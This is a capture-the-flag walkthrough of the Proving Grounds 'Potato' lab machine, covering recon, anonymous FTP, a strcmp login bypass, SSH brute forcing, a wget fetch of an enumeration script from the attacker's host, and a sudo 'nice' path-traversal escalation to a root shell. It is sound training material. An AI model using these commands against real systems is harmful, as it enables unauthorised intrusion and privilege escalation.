---
title: "Potato"
date: 2024-11-10
draft: false
summary: "Writeup for the Potato proving grounds CTF challenge."
tags: ["linux", "hardcoded creds", "sudo"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/potato/5.webp"
  caption: "Potato Proving Grounds Challenge"
  alt: "Potato cover"
platform: "Misc"
---

Potato is a CTF challenge on **proving grounds** that require us to get root access on the system and capture the flag from the *root* directory.
<!--more-->
To access the lab, visit the link given below:
- https://portal.offsec.com/labs/play

## Recon

I performed an **nmap** aggressive scan to find information about the target.

```shell
nmap -A -p- TARGET -oN potato.nmap --min-rate 10000
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |
| 2112     | ftp         |

![](https://cdn.ziomsec.com/potato/1.webp)

## Initial Foothold

**nmap**'s aggressive scan detected ftp anonymous login on the target using `nse` scripts - so I logged into the ftp server and found 2 files.

```shell
ftp -P 2112 TARGET
# username: anonymouse | password: anonymous
> get index.php.bak index.php.bak
> get welcome.msg welcome.msg
```

![](https://cdn.ziomsec.com/potato/2.webp)

The `index.php.bak` file revealed login credentials for *admin*.

```shell
cat ftp/index.php.bak
```

![](https://cdn.ziomsec.com/potato/3.webp)

I then visited the web application but found nothing on the home page.

![](https://cdn.ziomsec.com/potato/4.webp)

I performed a web directory brute force using **ffuf** to find hidden directories and found 2 directories, `admin` and `potato`.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301
```

![](https://cdn.ziomsec.com/potato/5.webp)

I visited both the endpoints and found a login panel at */admin*

![](https://cdn.ziomsec.com/potato/6.webp)

![](https://cdn.ziomsec.com/potato/7.webp)

I tried logging in using the username and password that I had found but failed.

![](https://cdn.ziomsec.com/potato/8.webp)

The login mechanism used `strcmp` to check whether the username and password were correct.  So I looked for ways to bypass `strcmp`.

![](https://cdn.ziomsec.com/potato/9.webp)

![](https://cdn.ziomsec.com/potato/10.webp)

![](https://cdn.ziomsec.com/potato/11.webp)

Hence if I modified the password parameter, I could potentially bypass the security check. To try it out, I fired up **burp suite** and captured a login request. I then changed the `password` parameter as show below and forwarded the request.

![](https://cdn.ziomsec.com/potato/12.webp)

Hence I got access to the admin area but found nothing useful here.

![](https://cdn.ziomsec.com/potato/13.webp)

As a last resort, I tried to bruteforce **ssh** credentials using **nmap** and succeeded.

```shell
nmap -p 22 --script=/usr/share/nmap/scripts/ssh-brute.nse TARGET
```

![](https://cdn.ziomsec.com/potato/14.webp)
![](https://cdn.ziomsec.com/potato/15.webp)

I used these credentials to log into the system.

```shell
ssh webadmin@TARGET
# enter password
```

![](https://cdn.ziomsec.com/potato/16.webp)

## Privilege Escalation

I downloaded the **linux smart enumeration** script on the target and gave it executable permission.

```shell
$ wget "http://KALI/lse.sh"
$ chmod +x lse.sh
```

![](https://cdn.ziomsec.com/potato/17.webp)

I then ran the script to find misconfigurations on the system.

![](https://cdn.ziomsec.com/potato/18.webp)

![](https://cdn.ziomsec.com/potato/19.webp)

![](https://cdn.ziomsec.com/potato/20.webp)

The script revealed I could run a particular command as **sudo** without any password.

![](https://cdn.ziomsec.com/potato/21.webp)

I looked for ways to exploit the **nice** binary on **gtfobins** and tried it, however, it failed.

```shell
sudo nice /bin/sh
```

![](https://cdn.ziomsec.com/potato/22.webp)

![](https://cdn.ziomsec.com/potato/23.webp)

Hence, I could only execute the entire command and not a single binary. Also, I looked inside the **`/notes`** directory and found shell scripts in it. However, due to lack of privilege, I couldn't add or modify any script here. So I used relative path to make it execute a shell script from my home directory.

```shell
$ echo "#/bin/bash" > shell.sh
$ echo "bash -i" >> shell.sh
$ chmod +x shell.sh
$ sudo /bin/nice /notes/../home/webadmin/shell.sh
```

![](https://cdn.ziomsec.com/potato/24.webp)

This approach made me a **root** user. I then captured the flag from the `/root` directory.

![](https://cdn.ziomsec.com/potato/25.webp)

## Closure

Here's a short summary of how I pwned **potato**:
- I found a login panel backup file on the ftp server.
- This file revealed login credentials for admin, however, the admin panel did not provide anything useful.
- Since FTP and HTTP did not reveal anything useful, I used **nmap**'s `ssh-brute` script to brute force **ssh** credentials.
- After logging in, I found out that *webadmin* was allowed to run scripts inside */notes* directory as sudo with **nice**.
- Since I did not have permissions to write inside the scripts present in the *notes* directory, I used relative path to execute a script present on my home directory to spawn an interactive bash shell as root.
- Finally, I captured the flag from the *root* directory.

That was the complete walkthrough of **potato**. Hope you learnt something new!
Happy Hacking :)

---
